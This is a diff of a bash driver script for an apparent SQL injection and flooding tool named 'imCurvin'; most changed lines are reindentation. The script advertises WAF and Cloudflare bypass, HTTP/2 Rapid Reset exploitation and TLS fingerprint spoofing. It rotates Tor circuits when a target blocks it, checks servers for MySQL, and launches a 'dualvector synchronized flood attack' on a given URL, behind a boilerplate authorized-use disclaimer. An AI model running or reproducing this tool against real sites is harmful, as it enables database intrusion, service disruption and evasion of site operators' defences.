-    echo -e "* \e[1mPayload Pen-Testing Masking\e[0m: Conceals detection signatures through \e[1mrandomized case conversion, space2comment encoding, XOR encryption\e[0m, and \e[1mBase64 encoding matrices\e[0m."
-    echo -e ""
-    echo -e "* \e[1mIntelligent Header Injection\e[0m: Injects spoofed IP headers, \e[1mCloudflare bypass chains\e[0m, and cache-control directives tailored specifically to complex URL parameter structures."
-    echo -e ""
-    echo -e "* \e[1mProtocol Exploitation\e[0m: Executes synchronized \e[1mJA3/JA4 TLS Fingerprint Spoofing, HTTP/2 Rapid Reset Protocol Exploitation\e[0m via a customizable high-concurrency window (defaulted to \e[1m50 concurrent streams\e[0m), \e[1mHTTP Chunked Transfer Encoding Mismatch\e[0m, and \e[1mAutomated Control Loop Shadowban Evasion\e[0m."
-    echo -e ""
+          echo -e "\e[34mAdvanced WAF Bypass & Obfuscation\e[0m"
+          echo -e "The engine deploys a \e[1msynchronized dual-vector parallel attack\e[0m that simultaneously probes MySQL time-based anomalies using multi-layered payload obfuscation and intelligent header injection, featuring:"
+          echo -e ""
+          echo -e "* \e[1mStacked Queries Injection\e[0m: Utilizes the stacked query technique (\e[1m;\e[0m) to terminate the application's original database query and force the independent execution of injected dynamic SQL statements."
+          echo -e ""
+          echo -e "* \e[1mHTTP Parameter Pollution (HPP) Splitting\e[0m: Injects duplicated query parameters with identical names (\e[1mparam_name=999&param_name=payload\e[0m) to exploit parsing discrepancies between the front-end WAF and the back-end application server, effectively masking malicious database payloads behind benign values."
+          echo -e ""
+          echo -e "* \e[1mPayload Pen-Testing Masking\e[0m: Conceals detection signatures through \e[1mrandomized case conversion, space2comment encoding, XOR encryption\e[0m, and \e[1mBase64 encoding matrices\e[0m."
+          echo -e ""
+          echo -e "* \e[1mIntelligent Header Injection\e[0m: Injects spoofed IP headers, \e[1mCloudflare bypass chains\e[0m, and cache-control directives tailored specifically to complex URL parameter structures."
+          echo -e ""
+          echo -e "* \e[1mProtocol Exploitation\e[0m: Executes synchronized \e[1mJA3/JA4 TLS Fingerprint Spoofing, HTTP/2 Rapid Reset Protocol Exploitation\e[0m via a customizable high-concurrency window (defaulted to \e[1m50 concurrent streams\e[0m), \e[1mHTTP Chunked Transfer Encoding Mismatch\e[0m, and \e[1mAutomated Control Loop Shadowban Evasion\e[0m."
+          echo -e ""
 
-    echo -e "\e[34mAutomated IP Re-Birth via TOR NEWNYM\e[0m"
-    echo -e "To ensure uninterrupted execution against active threat mitigation systems, imcurvin integrates an automated defensive evasion loop:"
-    echo -e ""
-    echo -e "* \e[1mBlock Detection\e[0m: If the target infrastructure responds with a block status (such as \e[1mHTTP 403 Forbidden\e[0m or \e[1m429 Too Many Requests\e[0m), the engine dynamically triggers a \e[1m\"SIGNAL NEWNYM\"\e[0m instruction across the active port array."
-    echo -e ""
-    echo -e "* \e[1mInstant Rotation\e[0m: Instantiates an immediate circuit teardown and rebuild, rotating the outbound exit node mapping \e[1mwithin milliseconds\e[0m without interrupting the primary multi-threaded attack vector."
-    echo -e ""
+          echo -e "\e[34mAutomated IP Re-Birth via TOR NEWNYM\e[0m"
+          echo -e "To ensure uninterrupted execution against active threat mitigation systems, imcurvin integrates an automated defensive evasion loop:"
+          echo -e ""
+          echo -e "* \e[1mBlock Detection\e[0m: If the target infrastructure responds with a block status (such as \e[1mHTTP 403 Forbidden\e[0m or \e[1m429 Too Many Requests\e[0m), the engine dynamically triggers a \e[1m\"SIGNAL NEWNYM\"\e[0m instruction across the active port array."
+          echo -e ""
+          echo -e "* \e[1mInstant Rotation\e[0m: Instantiates an immediate circuit teardown and rebuild, rotating the outbound exit node mapping \e[1mwithin milliseconds\e[0m without interrupting the primary multi-threaded attack vector."
+          echo -e ""
 
-    echo -e "\e[34mPost-Scan Validation Engine\e[0m"
-    echo -e "* \e[1mLatency Isolation\e[0m: Every time-based anomaly generated during the attack is filtered by a specialized post-scan \e[1mPython validation engine\e[0m designed to isolate baseline network latency from genuine database thread delays."
-    echo -e ""
-    echo -e "* \e[1mEnvironment Safeguard\e[0m: The framework detects \e[1mnon-MySQL environments\e[0m and aborts execution to prevent \"resource wastage.\""
-    echo -e ""
-    exit 0
-}
+          echo -e "\e[34mPost-Scan Validation Engine\e[0m"
+          echo -e "* \e[1mLatency Isolation\e[0m: Every time-based anomaly generated during the attack is filtered by a specialized post-scan \e[1mPython validation engine\e[0m designed to isolate baseline network latency from genuine database thread delays."
+          echo -e ""
+          echo -e "* \e[1mEnvironment Safeguard\e[0m: The framework detects \e[1mnon-MySQL environments\e[0m and aborts execution to prevent \"resource wastage.\""
+          echo -e ""
+          exit 0
+        }
         print_defiance_logo
         if [[ "$tech" = "true" ]]; then
-        show_tech
+          show_tech
         fi
 
-if [ -z "$target_url" ]; then
-    echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Error: URL not specified."
-    echo -e "\e[0;37m[\e[0mi\e[0;37m]\e[0m Please refer to the option guide below:\n"
-    helping
-    exit 1
-fi
+        if [ -z "$target_url" ]; then
+          echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Error: URL not specified."
+          echo -e "\e[0;37m[\e[0mi\e[0;37m]\e[0m Please refer to the option guide below:\n"
+          helping
+          exit 1
+        fi
 
-if [[ "$show_help" = "true" ]]; then
-    helping
-fi
+        if [[ "$show_help" = "true" ]]; then
+          helping
+        fi
 
-for cmd in nc curl tor flock pgrep xxd; do
-    case "$cmd" in
-        nc)
-            if ! command -v nc &> /dev/null && ! command -v netcat &> /dev/null; then
+        for cmd in nc curl tor flock pgrep xxd; do
+          case "$cmd" in
+            nc)
+              if ! command -v nc &> /dev/null && ! command -v netcat &> /dev/null; then
                 echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: 'netcat' is not installed on your terminal."
                 echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install netcat-openbsd first before running imCurvin'."
                 exit 1
-            fi
+              fi
             ;;
-        *)
-            if ! command -v "$cmd" &> /dev/null; then
+            *)
+              if ! command -v "$cmd" &> /dev/null; then
                 echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: '$cmd' is not installed on your terminal."
                 echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install $cmd first before running imCurvin'."
                 exit 1
-            fi
+              fi
             ;;
-    esac
-done
+          esac
+        done
 
-if [[ "$recon" = "true" ]]; then
-    reconi
-fi
+        if [[ "$recon" = "true" ]]; then
+          reconi
+        fi
 
-echo -e "\n[\033[34mWARNING\033[0m] ImCurvin is designed for \033[1mauthorized security testing and educational purposes only.\033[0m"
-echo -e "Running this tool against targets without priorwritten consent is strictly illegal. \033[1mThe developer assumes no liability and not responsible for any misuse, damage, or system instability caused by this software.\033[0m By executing this script, you agree to these terms."
-sleep 2 
+        echo -e "\n[\033[34mWARNING\033[0m] ImCurvin is designed for \033[1mauthorized security testing and educational purposes only.\033[0m"
+        echo -e "Running this tool against targets without priorwritten consent is strictly illegal. \033[1mThe developer assumes no liability and not responsible for any misuse, damage, or system instability caused by this software.\033[0m By executing this script, you agree to these terms."
+        sleep 2
 
-echo -e "\n[\033[34m${ayamaa}\033[0m] [i]\e[0m Checking for TOR terminal service..."
+        echo -e "\n[\033[34m${ayamaa}\033[0m] [i]\e[0m Checking for TOR terminal service..."
 
-if pgrep -x "tor" >/dev/null 2>&1; then
-    echo -e "[\033[34m${ayamaa}\033[0m] [i] \033[1mTor terminal service detected as active.\033[0m"
-else
-    echo -e "[\033[34m${ayamaa}\033[0m] [->] WARNING: Tor terminal service is not detected/running."
-    echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Run 'tor' command in a new terminal before using Defiance Mode."
-    echo -e "[\033[34m${ayamaa}\033[0m] [->] Operation aborted due to environment mismatch."
-    exit 1
-fi
+        if pgrep -x "tor" >/dev/null 2>&1; then
+          echo -e "[\033[34m${ayamaa}\033[0m] [i] \033[1mTor terminal service detected as active.\033[0m"
+        else
+          echo -e "[\033[34m${ayamaa}\033[0m] [->] WARNING: Tor terminal service is not detected/running."
+          echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Run 'tor' command in a new terminal before using Defiance Mode."
+          echo -e "[\033[34m${ayamaa}\033[0m] [->] Operation aborted due to environment mismatch."
+          exit 1
+        fi
 
-echo -e "[\033[34m${ayamaa}\033[0m] [i] Tracing target redirections."
-recon_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
-recon_proxy="--socks5-hostname 127.0.0.1:$recon_port"
-initial_url="$target_url"
+        echo -e "[\033[34m${ayamaa}\033[0m] [i] Tracing target redirections."
+        recon_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
+          recon_proxy="--socks5-hostname 127.0.0.1:$recon_port"
+          initial_url="$target_url"
 
-final_destination_url=$(curl "$recon_proxy" --connect-timeout 5 --retry 2 -m 8 -s -o /dev/null -w "%{url_effective}" -L "$initial_url")
+          final_destination_url=$(curl "$recon_proxy" --connect-timeout 5 --retry 2 -m 8 -s -o /dev/null -w "%{url_effective}" -L "$initial_url")
 
-if [ "$initial_url" != "$final_destination_url" ]; then
-    echo -e "[\033[34m${ayamaa}\033[0m] [!] Target redirected to: \033[32m$final_destination_url\033[0m"           
-    read -p "[?] Is this URL correct? (y/n): " user_confirm
-    user_confirm=$(echo "$user_confirm" | tr '[:upper:]' '[:lower:]')
+          if [ "$initial_url" != "$final_destination_url" ]; then
+            echo -e "[\033[34m${ayamaa}\033[0m] [!] Target redirected to: \033[32m$final_destination_url\033[0m"
+            read -p "[?] Is this URL correct? (y/n): " user_confirm
+            user_confirm=$(echo "$user_confirm" | tr '[:upper:]' '[:lower:]')
 
-    case "$user_confirm" in
-        y|yes)
-            echo -e "[\033[34m${ayamaa}\033[0m] [->] Continue with Redirected URL."
-            export target_url="$final_destination_url"
+            case "$user_confirm" in
+              y|yes)
+                echo -e "[\033[34m${ayamaa}\033[0m] [->] Continue with Redirected URL."
+                export target_url="$final_destination_url"
+              ;;
+              *)
+                echo -e "[\033[31m${ayamaa}\033[0m] [i] Continue with default URL will result in an unwanted error,"
+                clean_domain=$(echo "$target_url" | sed -e 's|^[^/]*//||' -e 's|/.*||' -e 's|:.*||')
+                dork "$clean_domain"
+                dork_status=$?
+                if [ $dork_status -ne 0 ]; then
+                  exit 1
+                fi
+              ;;
+            esac
+          fi
+
+          echo -e "[\033[34m${ayamaa}\033[0m] [i]\e[0m Testing connection to target URL."
+          http_status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$target_url")
+
+          case "$http_status" in
+            000)
+              echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Web Connection time out [10 Seconds]. The target URL might be very unstable."
+              exit 1
             ;;
-        *)
-            echo -e "[\033[31m${ayamaa}\033[0m] [i] Continue with default URL will result in an unwanted error,"
-            clean_domain=$(echo "$target_url" | sed -e 's|^[^/]*//||' -e 's|/.*||' -e 's|:.*||')
-            dork "$clean_domain"
-            dork_status=$?             
-            if [ $dork_status -ne 0 ]; then
-                exit 1
-            fi
+            2??|3??)
             ;;
-    esac
-fi             
-
-echo -e "[\033[34m${ayamaa}\033[0m] [i]\e[0m Testing connection to target URL."
-http_status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$target_url")
-
-case "$http_status" in
-    000)
-        echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Web Connection time out [10 Seconds]. The target URL might be very unstable."
-        exit 1
-        ;;
-    2??|3??)
-        ;;
-    *)
-        echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Target URL returned HTTP Status $http_status."
-        exit 1
-        ;;
-esac                    
+            *)
+              echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Target URL returned HTTP Status $http_status."
+              exit 1
+            ;;
+          esac
           if [ -f "$DEFIANCE_DIR/../validators/ayam.py" ]; then
-    echo -e "[\033[34m${ayamaa}\033[0m] [i] Analyzing parameter.."
-    
-    eye_report=$(python3 "$DEFIANCE_DIR/../validators/ayam.py" "$target_url")
-    param_type=$(echo "$eye_report" | cut -d'|' -f1)
-    discovered_keys=$(echo "$eye_report" | cut -d'|' -f3)
+            echo -e "[\033[34m${ayamaa}\033[0m] [i] Analyzing parameter.."
 
-    case "$param_type" in
-        "QUERY_PARAM")
-            echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m] \033[1mActive Query Parameters Spotted > ($discovered_keys)\033[0m"
-            export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
-            export REQ_METHOD="GET"
-            export TARGET_PARAM=$(echo "$discovered_keys" | cut -d',' -f1)
-            ;;
-        "PATH_PARAM"|"NO_PARAM")
-            echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Error: GET parameters not found [POST Method / Form Detected]."
-            echo -e "[\033[34m${ayamaa}\033[0m] [i] Action Required: Please inspect the target's HTML form elements to identify valid parameters first."
-            echo -e "\e[0;37m[-] Operation aborted to prevent invalid asset execution.\n"
-            exit 1
-            ;;
-        *)
-            if [[ "$target_url" != *"?"* ]]; then
+            eye_report=$(python3 "$DEFIANCE_DIR/../validators/ayam.py" "$target_url")
+            param_type=$(echo "$eye_report" | cut -d'|' -f1)
+            discovered_keys=$(echo "$eye_report" | cut -d'|' -f3)
+
+            case "$param_type" in
+              "QUERY_PARAM")
+                echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m] \033[1mActive Query Parameters Spotted > ($discovered_keys)\033[0m"
+                export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
+                export REQ_METHOD="GET"
+                export TARGET_PARAM=$(echo "$discovered_keys" | cut -d',' -f1)
+              ;;
+              "PATH_PARAM"|"NO_PARAM")
                 echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Error: GET parameters not found [POST Method / Form Detected]."
                 echo -e "[\033[34m${ayamaa}\033[0m] [i] Action Required: Please inspect the target's HTML form elements to identify valid parameters first."
                 echo -e "\e[0;37m[-] Operation aborted to prevent invalid asset execution.\n"
                 exit 1
-            else
-                echo -e "[\033[34m${ayamaa}\033[0m] [i]\033[1m No parameters detected. Falling back to default.\033[0m"
-                export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
-                export REQ_METHOD="GET"
-            fi
-            ;;
-    esac
-fi
+              ;;
+              *)
+                if [[ "$target_url" != *"?"* ]]; then
+                  echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Error: GET parameters not found [POST Method / Form Detected]."
+                  echo -e "[\033[34m${ayamaa}\033[0m] [i] Action Required: Please inspect the target's HTML form elements to identify valid parameters first."
+                  echo -e "\e[0;37m[-] Operation aborted to prevent invalid asset execution.\n"
+                  exit 1
+                else
+                  echo -e "[\033[34m${ayamaa}\033[0m] [i]\033[1m No parameters detected. Falling back to default.\033[0m"
+                  export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
+                  export REQ_METHOD="GET"
+                fi
+              ;;
+            esac
+          fi
 
-cookie_flag=""
-if [ -n "$custom_cookie" ]; then
-    cookie_flag="-b $custom_cookie"
-    echo "[\033[34m${ayamaa}\033[0m] [i] Custom Cookie inputted: $custom_cookie"
-fi
+          cookie_flag=""
+          if [ -n "$custom_cookie" ]; then
+            cookie_flag="-b $custom_cookie"
+            echo "[\033[34m${ayamaa}\033[0m] [i] Custom Cookie inputted: $custom_cookie"
+          fi
 
-echo -e "[\033[34m${ayamaa}\033[0m] [i] Performing database environment verification.."
-server_fingerprint=$(curl "$recon_proxy" -m 5 -s -I "$target_url" | grep -Ei "(Server|X-Powered-By|Set-Cookie|X-DDoS|WAF)")
+          echo -e "[\033[34m${ayamaa}\033[0m] [i] Performing database environment verification.."
+          server_fingerprint=$(curl "$recon_proxy" -m 5 -s -I "$target_url" | grep -Ei "(Server|X-Powered-By|Set-Cookie|X-DDoS|WAF)")
 
-if echo "$server_fingerprint" | grep -qEi "(oracle|postgre|mssql|microsoft-iis|supabase)"; then
-    echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Target rejected, Non MySQL environment fingerprint."
-    echo -e "[i] Footprint: $(echo "$server_fingerprint" | tr '\r\n' ' ')"
-    echo -e "[\033[34m${ayamaa}\033[0m][->] Revert. Operation aborted to prevent structural asset wastage."
-    exit 1
-else
-    echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m]\e[0m \033[1mTarget environment matches MySQL compliance directives.\033[0m"
-fi
+          if echo "$server_fingerprint" | grep -qEi "(oracle|postgre|mssql|microsoft-iis|supabase)"; then
+            echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Target rejected, Non MySQL environment fingerprint."
+            echo -e "[i] Footprint: $(echo "$server_fingerprint" | tr '\r\n' ' ')"
+            echo -e "[\033[34m${ayamaa}\033[0m][->] Revert. Operation aborted to prevent structural asset wastage."
+            exit 1
+          else
+            echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m]\e[0m \033[1mTarget environment matches MySQL compliance directives.\033[0m"
+          fi
 
-if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
-    echo -e "[\033[34m${ayamaa}\033[0m] [i] This web envi is outdated/just a test, to ensure the payloads to be executed, \033[1mthe tamper has been downgraded \033[0m[Space2comment, randomcase only]."
-fi
+          if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
+            echo -e "[\033[34m${ayamaa}\033[0m] [i] This web envi is outdated/just a test, to ensure the payloads to be executed, \033[1mthe tamper has been downgraded \033[0m[Space2comment, randomcase only]."
+          fi
 
-sleep 1
+          sleep 1
 
-if [ "$enable_val" = "true" ] && [ -s "$ROOT_LOG_FILE" ]; then
-    echo -e "[\033[34m${ayamaa}\033[0m] [?] Your log file is not empty."
-    read -p "[\033[34m${ayamaa}\033[0m] Do you want to overwrite it? (y/n): " tanya
-    tanya=$(echo "$tanya" | tr '[:upper:]' '[:lower:]')
-    
-    case "$tanya" in
-        y|yes)
-            > "$ROOT_LOG_FILE"
-            echo -e "[\033[34m${ayamaa}\033[0m] [\033[34m+\e[0m] \033[1mLog overwritten.\033[0m\n"
-            ;;
-        *)
-            echo -e "[\033[34m${ayamaa}\033[0m] [i] Previous log entries will also be scanned."
-            ;;
-    esac
-fi
+          if [ "$enable_val" = "true" ] && [ -s "$ROOT_LOG_FILE" ]; then
+            echo -e "[\033[34m${ayamaa}\033[0m] [?] Your log file is not empty."
+            read -p "[\033[34m${ayamaa}\033[0m] Do you want to overwrite it? (y/n): " tanya
+            tanya=$(echo "$tanya" | tr '[:upper:]' '[:lower:]')
 
-echo -e "[\033[34m${ayamaa}\033[0m] [i] Launching dualvector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"                 
+            case "$tanya" in
+              y|yes)
+                > "$ROOT_LOG_FILE"
+                echo -e "[\033[34m${ayamaa}\033[0m] [\033[34m+\e[0m] \033[1mLog overwritten.\033[0m\n"
+              ;;
+              *)
+                echo -e "[\033[34m${ayamaa}\033[0m] [i] Previous log entries will also be scanned."
+              ;;
+            esac
+          fi
 
-                    vector_sqli_agressor_left &
+          echo -e "[\033[34m${ayamaa}\033[0m] [i] Launching dualvector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"
+
+          vector_sqli_agressor_left &
           pid_vector1=$!
 
           vector_sqli_agressor_right &
@@ -831,11 +831,10 @@ echo -e "[\033[34m${ayamaa}\033[0m] [i] Launching dualvector synchronized flood 
           fi
 
           echo ""
-            
-          
-               
 
 
-   
+
+        
               
             
+          
